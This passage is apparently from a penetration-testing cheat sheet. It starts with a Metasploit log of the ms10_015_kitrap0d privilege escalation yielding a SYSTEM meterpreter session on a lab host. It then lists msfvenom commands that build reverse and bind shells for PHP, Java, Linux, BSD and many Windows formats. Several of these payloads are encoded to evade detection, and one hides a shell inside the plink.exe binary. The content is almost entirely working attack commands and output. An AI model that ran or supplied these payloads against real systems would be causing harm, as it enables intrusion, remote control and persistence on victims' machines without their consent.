   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     1338             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338

LPORT => 1338


msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3

SESSION => 3


msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.5:1338 
[*] Launching notepad to host the exploit...
[+] Process 3552 launched.
[*] Reflectively injecting the exploit DLL into 3552...
[*] Injecting exploit into 3552 ...
[*] Exploit injected. Injecting payload into 3552...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

### PHP reverse shell  

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
```

### Java WAR reverse shell  

```bash
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
```

### Linux bind shell  

```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
```

### Linux FreeBSD reverse shell  

```bash
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf
```

### Linux C reverse shell  

```bash
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
```

### Windows non staged reverse shell  

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
```

### Windows Staged (Meterpreter) reverse shell  

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe
```

### Windows Python reverse shell  

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py
```

### Windows ASP reverse shell  

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp
```

### Windows ASPX reverse shell
```bash
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
```

### Windows JavaScript reverse shell with nops  

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18
```

### Windows Powershell reverse shell  

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
```

### Windows reverse shell excluding bad characters  

```bash
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
```

### Windows x64 bit reverse shell  

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
```

### Windows reverse shell embedded into plink  

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```